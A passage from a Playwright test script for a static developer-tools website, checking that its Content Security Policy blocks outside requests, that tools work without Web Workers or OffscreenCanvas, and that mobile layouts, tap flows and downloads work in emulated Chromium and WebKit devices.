      out.frame = window.__csp.includes("frame-src") || window.__csp.includes("child-src") ? "blocked" : "NOT REPORTED";
      frame.remove();
      out.violations = [...new Set(window.__csp)].sort().join(",");
      return out;
    });
    await probeContext.close();
    const failures = Object.entries(probe).filter(([key, value]) => key !== "violations" && value !== "blocked");
    assert(failures.length === 0, JSON.stringify(probe));
    assert(reached.length === 0, `a blocked request got a response: ${reached[0]}`);
    return `${Object.keys(probe).length - 1} probes blocked, nothing reached example.com; violations: ${probe.violations}`;
  });

  group = `${name} fallbacks`;
  console.log(`\n${group}`);
  for (const [label, disable] of [
    ["without Web Workers", ["Worker"]],
    ["without OffscreenCanvas", ["OffscreenCanvas"]],
  ]) {
    await check(`JSON and image tools work ${label}`, async () => {
      const { context: ctx, log: fallbackLog } = await newContext(browser, origin, { disable });
      const p = await ctx.newPage();
      await open(ctx, `${site}/tools/json-formatter/`);
      await p.locator("textarea").first().fill('{"n":12345678901234567890}');
      await p.getByRole("button", { name: "Format JSON" }).click();
      assert((await p.locator("textarea[readonly]").inputValue()).includes("12345678901234567890"), "JSON failed");
      await open(ctx, `${site}/tools/image-compressor/`);
      await p.locator("input[type=file]").setInputFiles([fixtures.transparentPng, fixtures.rotatedJpeg]);
      await p.getByRole("button", { name: "Compress 2 images" }).click();
      await p
        .locator("li", { hasText: "portrait.jpg" })
        .getByRole("link", { name: "Download" })
        .waitFor({ timeout: 30_000 });
      assert(
        (await p.locator("li", { hasText: "portrait.jpg" }).innerText()).includes("32 × 64"),
        "orientation lost in fallback",
      );
      await p.locator("li", { hasText: "logo.png" }).getByRole("link", { name: "Download" }).waitFor();
      const workers = await p.evaluate(() => window.__workers);
      assert(fallbackLog.errors.length === 0, fallbackLog.errors.slice(0, 2).join("; "));
      await ctx.close();
      return disable[0] === "Worker" ? "ran on the page" : `workers used: ${workers.created}`;
    });
  }
}

/* -------------------------------------------------------------------------- */
/* Mobile emulation                                                           */
/* -------------------------------------------------------------------------- */

async function mobileChecks(label, browser, device, site, origin, fixtures) {
  group = `${label}`;
  console.log(`\n${group} (${device.viewport.width}×${device.viewport.height})`);
  const { context, log } = await newContext(browser, origin, { device });
  const page = await context.newPage();

  await check("no horizontal overflow, portrait and landscape", async () => {
    const bad = [];
    for (const size of [device.viewport, { width: device.viewport.height, height: device.viewport.width }]) {
      await page.setViewportSize(size);
      for (const route of ROUTES) {
        await open(context, `${site}${route}`);
        const overflow = await page.evaluate(() => document.documentElement.scrollWidth - window.innerWidth);
        if (overflow > 1) bad.push(`${route} ${size.width}px +${overflow}`);
      }
    }
    await page.setViewportSize(device.viewport);
    assert(bad.length === 0, bad.join(", "));
    return `${ROUTES.length} routes × 2 orientations`;
  });

  await check("form text is at least 16 px (no zoom on focus in iOS Safari)", async () => {
    const small = [];
    for (const route of ["/", "/tools/", ...TOOLS.map((slug) => `/tools/${slug}/`)]) {
      await open(context, `${site}${route}`);
      const found = await page.evaluate(() =>
        [
          ...document.querySelectorAll(
            "main input:not([type=radio]):not([type=checkbox]):not([type=file]):not([type=range]):not([type=color]), main textarea, main select, header input, form[role=search] input",
          ),
        ]
          .filter((el) => parseFloat(getComputedStyle(el).fontSize) < 16)
          .map((el) => `${el.tagName.toLowerCase()} ${getComputedStyle(el).fontSize}`),
      );
      if (found.length) small.push(`${route}: ${found.join(", ")}`);
    }
    assert(small.length === 0, small.join("; "));
  });

  await check("tap flows: UUID, JSON, Base64, text counter", async () => {
    await open(context, `${site}/tools/uuid-generator/`);
    await page.locator("label", { hasText: "v7 · time-ordered" }).tap();
    await page.getByRole("button", { name: "Generate" }).tap();
    assert(/^[0-9a-f-]{36}$/.test(await page.locator("textarea[readonly]").inputValue()), "UUID not generated");
    await open(context, `${site}/tools/json-formatter/`);
    await page.locator("textarea").first().tap();
    await page.locator("textarea").first().fill('[1,2,{"a":true}]');
    await page.getByRole("button", { name: "Format JSON" }).tap();
    await page.locator("textarea[readonly]").waitFor();
    await open(context, `${site}/tools/base64/`);
    await page.locator("textarea").first().fill("mobile ✓");
    await page.getByRole("button", { name: "Encode", exact: true }).tap();
    assert(
      (await page.locator("textarea[readonly]").inputValue()) === Buffer.from("mobile ✓").toString("base64"),
      "Base64 wrong",
    );
    await open(context, `${site}/tools/text-counter/`);
    await page.locator("textarea").fill("one two three");
    await page.waitForFunction(() => document.querySelector("dl dd")?.textContent === "3");
  });

  await check("image compressor: chooser, compress, download", async () => {
    await open(context, `${site}/tools/image-compressor/`);
    const [chooser] = await Promise.all([
      page.waitForEvent("filechooser"),
      page.getByText("Choose files", { exact: true }).tap(),
    ]);
    await chooser.setFiles([fixtures.rotatedJpeg, fixtures.largeJpeg]);
    await page.getByRole("button", { name: "Compress 2 images" }).tap();
    await page
      .locator("li", { hasText: "large.jpg" })
      .getByRole("link", { name: "Download" })
      .waitFor({ timeout: 60_000 });
    const file = await download(page, () =>
      page.locator("li", { hasText: "portrait.jpg" }).getByRole("link", { name: "Download" }).tap(),
    );
    assert(magic(file.bytes) === "jpeg", "download is not a JPEG");
    const overflow = await page.evaluate(() => document.documentElement.scrollWidth - window.innerWidth);
    assert(overflow <= 1, `results overflow by ${overflow}px`);
  });

  await check("QR generator: code and downloads", async () => {
    await open(context, `${site}/tools/qr-generator/`);
    await page.locator("textarea").fill("https://example.com/mobile");
    await page.locator('svg[role="img"] path').waitFor();
    const box = await page.locator('svg[role="img"]').boundingBox();
    assert(box && box.width >= 150, `QR preview only ${box?.width}px wide`);
    const png = await download(page, () => page.getByRole("link", { name: "Download PNG" }).tap());
    assert(magic(png.bytes) === "png", "PNG download failed");
  });

  await check("no errors and no external requests", async () => {
    assert(log.errors.length === 0, log.errors.slice(0, 2).join("; "));
    assert(log.external.length === 0, log.external.slice(0, 2).join(", "));
  });

  await context.close();
}

/* -------------------------------------------------------------------------- */
/* Run                                                                        */
/* -------------------------------------------------------------------------- */

async function main() {
  const root = resolve("out");
  if (!existsSync(join(root, "index.html"))) {
    console.error("out/ is missing. Run `npm run build:static` first.");
    exit(2);
  }
  const { server, origin } = await startStaticServer(root, basePath);
  const site = `${origin}${basePath}`;
  console.log(`Testing ${site}/ in ${selected.join(", ")}`);

  const fixtureBrowser = await chromium.launch();
  const fixtures = await makeFixtures(fixtureBrowser);
  await fixtureBrowser.close();
  const versions = [];

  try {
    for (const name of selected) {
      const browser = await ENGINES[name].launch();
      versions.push(`${name} ${browser.version()}`);
      await desktopChecks(name, browser, site, origin, fixtures);
      if (name === "chromium")
        await mobileChecks("Pixel 7 (Chromium emulation)", browser, devices["Pixel 7"], site, origin, fixtures);
      if (name === "webkit") {
        await mobileChecks("iPhone 13 (WebKit emulation)", browser, devices["iPhone 13"], site, origin, fixtures);
        await mobileChecks(
          "iPhone SE (WebKit emulation, 320 px)",
          browser,
          devices["iPhone SE"],
          site,
          origin,
          fixtures,
        );
      }
      await browser.close();
    }
  } finally {
    server.close();
  }

  const failed = results.filter((result) => !result.ok);
  const summary = `${results.length - failed.length}/${results.length} checks passed (${versions.join(", ")})`;
  console.log(`\n${summary}`);
  const report = flag("--report");
  if (report) {
    await writeFile(
      report,
      `${[summary, ...results.map((r) => `${r.ok ? "PASS" : "FAIL"}  ${r.label}${r.detail ? ` — ${r.detail}` : ""}`)].join("\n")}\n`,
      "utf8",
    );
  }
  exit(failed.length === 0 ? 0 : 1);
}

await main();
